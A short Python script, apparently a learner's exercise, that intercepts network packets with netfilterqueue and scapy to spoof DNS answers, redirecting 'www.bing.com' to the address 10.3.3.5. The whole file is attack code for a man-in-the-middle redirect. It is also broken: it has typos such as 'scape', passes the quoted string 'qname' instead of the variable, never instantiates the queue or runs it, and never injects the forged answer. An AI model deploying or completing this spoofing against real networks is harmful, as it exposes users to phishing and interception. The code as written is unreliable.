#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())## scapu.IP  this is converting ip packets.
    if scapy_packet.haslayer(scapy.DNSRR): ### this is a a filter DNS requests.
      qname = scapy_packet[scapy.DNSQR].qname ## this is showing DNS qustioin table
      if "www.bing.com" in qname:
          print("spoffing target\n")
          answer = scape.DNSRR(rname="qname",rdata="10.3.3.5")
          
        
      print(scapy_packet.show()) 
    packet.accept()
queue = netfilterqueue.NetfilterQueue 
queue.bind(0,process_packet) 
    